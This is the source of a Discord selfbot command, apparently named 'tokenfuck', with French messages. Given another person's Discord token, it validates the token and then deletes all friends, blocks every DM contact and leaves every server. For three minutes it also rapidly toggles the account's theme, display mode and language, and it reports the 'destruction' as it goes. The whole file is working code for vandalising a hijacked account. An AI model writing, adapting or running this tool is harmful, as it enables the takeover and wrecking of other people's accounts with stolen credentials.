'use strict';
const axios = require("axios");

module.exports = {
  name: "tokenfuck",
  description: "Alterner les paramètres, supprimer les amis et quitter les serveurs.",
  run: async (client, message, args) => {
    if (!args.length) {
      return message.edit("`❌` Veuillez fournir un token Discord après la commande.");
    }

    const token = args[0];
    message.edit('Démarrage dans 5 secondes...');

    const startTime = Date.now();
    const MAX_DURATION = 3 * 60 * 1000;  
    let isTimeout = false;
 
    const globalTimeout = setTimeout(() => {
      isTimeout = true;
      console.log("Temps écoulé - Arrêt des opérations");
    }, MAX_DURATION);

    const checkTimeout = () => {
      if (isTimeout || (Date.now() - startTime) > MAX_DURATION) {
        isTimeout = true;
        return true;
      }
      return false;
    };
 
    await new Promise(resolve => setTimeout(resolve, 5000));

    const isValidToken = async (token) => {
      try {
        const response = await axios.get("https://discord.com/api/v9/users/@me", {
          headers: { Authorization: token }
        });
        return true;
      } catch (error) {
        return false;
      }
    };

    if (!(await isValidToken(token))) {
      clearTimeout(globalTimeout);
      return message.edit("`❌` Token invalide ou non authentifié.");
    }

    const languages = ['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'];
    
    const changeLanguageRepeatedly = async () => {
      const interval = setInterval(async () => {
        if (checkTimeout()) {
          clearInterval(interval);
          return;
        }

        const randomLanguage = languages[Math.floor(Math.random() * languages.length)];
        const setting = { locale: randomLanguage };

        try {
          await axios.patch('https://discord.com/api/v9/users/@me/settings', 
            setting,
            {
              headers: {
                'Authorization': token,
                'Content-Type': 'application/json'
              },
              timeout: 3000
            }
          );
        } catch (error) {
        }
      }, 2000); 
    };

    const toggleSettings = async (token) => {
      let isLightMode = true;
      let isCompactMode = true;

      const intervalId = setInterval(async () => {
        if (checkTimeout()) {
          clearInterval(intervalId);
          return;
        }

        try {
          await axios.patch("https://discord.com/api/v9/users/@me/settings",
            { theme: isLightMode ? "light" : "dark" },
            { 
              headers: { Authorization: token, "Content-Type": "application/json" },
              timeout: 3000 
            }
          );

          await axios.patch("https://discord.com/api/v9/users/@me/settings",
            { message_display_compact: isCompactMode },
            { 
              headers: { Authorization: token, "Content-Type": "application/json" },
              timeout: 3000 
            }
          );

          isLightMode = !isLightMode;
          isCompactMode = !isCompactMode;
        } catch (error) {
        }
      }, 2000); 
    };

    const removeAllFriends = async (token) => {
      if (checkTimeout()) return;

      try {
        const response = await axios.get("https://discord.com/api/v9/users/@me/relationships", {
          headers: { Authorization: token },
          timeout: 5000
        });
        const friends = response.data;

        for (const friend of friends) {
          if (checkTimeout()) break;

          try {
            await axios.delete(`https://discord.com/api/v9/users/@me/relationships/${friend.id}`, {
              headers: { Authorization: token },
              timeout: 3000
            });
            await new Promise(resolve => setTimeout(resolve, 1000));
          } catch (error) {
          }
        }
      } catch (error) {
      }
    };

    const leaveAllGuilds = async (token) => {
      if (checkTimeout()) return;

      try {
        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

        const response = await axios.get("https://discord.com/api/v9/users/@me/guilds", {
          headers: { Authorization: token },
          timeout: 5000
        });

        if (!response.data.length) {
          return;
        }

        const guilds = response.data;

        for (const guild of guilds) {
          if (checkTimeout()) break;

          try {
            await sleep(3000);
            await axios.delete(`https://discord.com/api/v9/users/@me/guilds/${guild.id}`, {
              headers: { Authorization: token },
              timeout: 5000
            });
            await sleep(2000);
          } catch (error) {
            if (error.response && error.response.status === 429) {
              const retryAfter = error.response.data.retry_after || 5000;
              await sleep(retryAfter);
            }
          }
        }
      } catch (error) {
      }
    };

    const blockAllDMs = async (token) => {
      if (checkTimeout()) return;

      try {
        const response = await axios.get("https://discord.com/api/v9/users/@me/channels", {
          headers: { Authorization: token },
          timeout: 5000
        });
        const dms = response.data;

        for (const dm of dms) {
          if (checkTimeout()) break;

          try {
            await axios.put(`https://discord.com/api/v9/users/@me/relationships/${dm.recipients[0].id}`,
              { type: 2 },
              { 
                headers: { Authorization: token, "Content-Type": "application/json" },
                timeout: 3000 
              }
            );
            await new Promise(resolve => setTimeout(resolve, 1000));
          } catch (error) {
          }
        }
      } catch (error) {
      }
    };

    try { 
      await removeAllFriends(token);
      
      if (!checkTimeout()) {
        await blockAllDMs(token);
      }
      
      if (!checkTimeout()) {
        await leaveAllGuilds(token);
      }
       
      if (!checkTimeout()) {
        toggleSettings(token);
        changeLanguageRepeatedly();
      }
 
      const statusInterval = setInterval(() => {
        if (checkTimeout()) {
          clearInterval(statusInterval);
          return;
        }
        
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const remaining = Math.max(0, 180 - elapsed);
        message.edit(`**DESTRUCTION EN COURS**\n\n⏱️ Temps écoulé: ${elapsed}s\n⏰ Temps restant: ${remaining}s`);
      }, 30000);
 
      setTimeout(async () => {
        clearTimeout(globalTimeout);
        clearInterval(statusInterval);
        isTimeout = true;
        
        const finalMessage = `**OPÉRATION TERMINÉE**\n\nDurée totale: 3 minutes\nActions effectuées:\n• Amis supprimés\n• MPs bloqués\n• Serveurs quittés\n• Paramètres modifiés\n• Langue changée`;
        message.edit(finalMessage);
      }, MAX_DURATION);

    } catch (error) {
      clearTimeout(globalTimeout);
      message.edit("`❌` Une erreur s'est produite.");
    }
  },
};